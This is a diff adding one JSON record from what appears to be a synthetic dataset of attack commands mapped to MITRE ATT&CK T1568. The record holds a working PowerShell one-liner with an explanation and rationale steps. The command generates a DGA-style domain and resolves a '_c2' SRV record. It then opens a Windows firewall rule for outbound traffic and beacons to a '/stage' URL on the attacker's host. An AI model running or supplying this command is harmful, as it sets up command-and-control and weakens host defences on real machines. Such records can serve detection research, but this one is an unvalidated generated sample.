@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $dom=('svc{0}.dgacontrol.org' -f (Get-Random -Min 1000 -Max 9999)); $srv=Resolve-DnsName ('_c2._tcp.{0}' -f $dom) -Type SRV -Server '1.1.1.1' -ErrorAction SilentlyContinue; if($srv){ $target=$srv[0].NameTarget.TrimEnd('.'); $port=$srv[0].Port; netsh advfirewall firewall add rule name=('out_'+$port) dir=out action=allow protocol=TCP remoteport=$port | Out-Null; Invoke-WebRequest -Uri ('https://{0}:{1}/stage' -f $target,$port) -Headers @{ Host=$dom } -TimeoutSec 7 -UseBasicParsing } }",
+  "explanation": "Leverages SRV records for dynamic target and port discovery, then opens the discovered port and initiates HTTPS communication using the resolved service target.",
+  "rationale_steps": [
+    "Generate a DGA-derived base domain.",
+    "Query SRV to obtain the authoritative host and port for C2.",
+    "Allow outbound traffic to the dynamically advertised port.",
+    "Beacon to the service target with the original Host header."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-62ede724",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
